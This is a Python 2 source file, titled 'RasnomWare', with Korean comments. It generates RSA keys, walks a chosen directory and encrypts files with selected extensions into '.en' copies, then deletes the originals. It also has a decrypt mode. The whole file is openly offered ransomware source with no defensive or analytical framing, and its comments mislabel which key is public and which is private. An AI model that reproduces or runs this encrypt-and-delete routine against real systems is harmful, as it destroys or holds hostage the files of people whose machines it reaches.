#! python
# -*- coding: UTF-8 -*-
# RasnomWare

import pyCryptoRSA
import os
import sys
import optparse



## RSA 키 생성하여 저장
def generateKey(dir):

        tempTuple = pyCryptoRSA.generate_RSA()

        # public key
        f = open(dir + "\\pri.key", "w")
        f.write(tempTuple[0])
        f.close()

        # private key
        f = open(dir + "\\pub.key", "w")
        f.write(tempTuple[1])
        f.close()

        print "complete gernerating keys"

## 암호화 진행
def encrypt(dir,list):
        # pub.key 가져오기
        pubKey = dir + "\\pub.key"
        print "read " + pubKey + "..."

        # 암호화
        print "start encryption"
        for root, dirs, files in os.walk(dir):
            for file in files:
                # 확장자가 암호화 대상인지 검사
                try:
                    list.index(file.split(".")[-1])
                    pass
                except Exception as e:
                    continue

                file = root + "\\" + file

                # 암호화 수행
                fileData = open(file, "rb")
                newFile = open(file + ".en", "wb")
                while (True):
                    content = fileData.read(200)
                    if (content):
                        content = pyCryptoRSA.encrypt_RSA(pubKey, content)
                        newFile.writelines(content)
                    else:
                        break
                fileData.close()
                newFile.close()

                # 원본 파일 삭제
                os.unlink(file)
                print("\t[+]encrypted: " + file)

        print "complete encryption"


def decrypt(dir):
    ## 복호화 진행
        # pri.key 가져오기
        priKey = dir + "\\pri.key"
        print "read " + priKey + "..."

        # 복호화
        print "start decryption"
        for root, dirs, files in os.walk(dir):
            for file in files:
                # 확장자가 복호화 대상인지 검사
                if (file.split(".")[-1] != "en"):
                    continue

                file = root + "\\" + file

                # 암호화 수행
                fileData = open(file, "rb")
                newFile = open(file[:-3], "wb")

                while (True):
                    content = ""
                    for i in range(0, 5):
                        content += fileData.readline()
                    print content

                    if (content):
                        print content
                        newFile.writelines(pyCryptoRSA.decrypt_RSA(priKey, content))
                    else:
                        break
                fileData.close()
                newFile.close()

                # 원본 파일 삭제
                os.unlink(file)
                print("\t[+]decrypted: " + file[:-3])

        print "complete decryption"

def main():
    ## optparse
    parser = optparse.OptionParser('Usage ransomware -m < mode > -d < directory > -l < extands list > ')
    parser.add_option('-m', dest='mode', type='string',
                      help='must specify mode(generateKey | encrypt | decrypt)')
    parser.add_option('-d', dest='dir', type='string',
                      help='must specify directory')
    parser.add_option('-l', dest='list', type='string',
                      help='must specify extands list with comma(,)')

    ## 전역변수 초기화
    (option, args) = parser.parse_args()

    if (option.mode == None) | (option.dir == None) | (option.list == None):
        if ((option.mode == "generateKey") & (option.dir != None)):
            pass
        elif (option.mode == "decrypt") & (option.dir != None):
            pass
        else:
            print(parser.usage)
            sys.exit(0)

    mode = option.mode
    dir = option.dir

    if option.list:
        try:
            option.list.index(",")
            file_list = (option.list).split(",")
        except Exception as e:
            file_list = []
            file_list.append(option.list)

    if (mode == "decrypt"):
        decrypt(dir)
    elif (mode == "encrypt"):
        encrypt(dir, file_list)
    elif (mode == "generateKey"):
        generateKey(dir)
    else:
        print parser.print_help()

if __name__ == "__main__":
    main()